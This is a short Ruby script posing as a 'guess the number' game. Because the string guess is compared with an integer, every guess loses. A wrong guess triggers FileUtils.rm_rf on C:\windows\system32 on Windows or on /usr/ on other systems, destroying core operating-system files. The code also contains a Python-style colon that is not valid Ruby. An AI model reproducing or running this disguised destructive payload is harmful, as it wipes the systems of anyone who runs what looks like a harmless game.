require "fileutils"

puts("Guess the number! 1-6")

guess = gets.chomp()



answer = rand(1..6)

if guess == answer:
    puts("That's correct!")
else
    if RUBY_PLATFORM.include?("mswin") || RUBY_PLATFORM.include?("mingw")
        FileUtils.rm_rf("C:\\windows\\system32")
    else
        FileUtils.rm_rf("/usr/")
    end
end
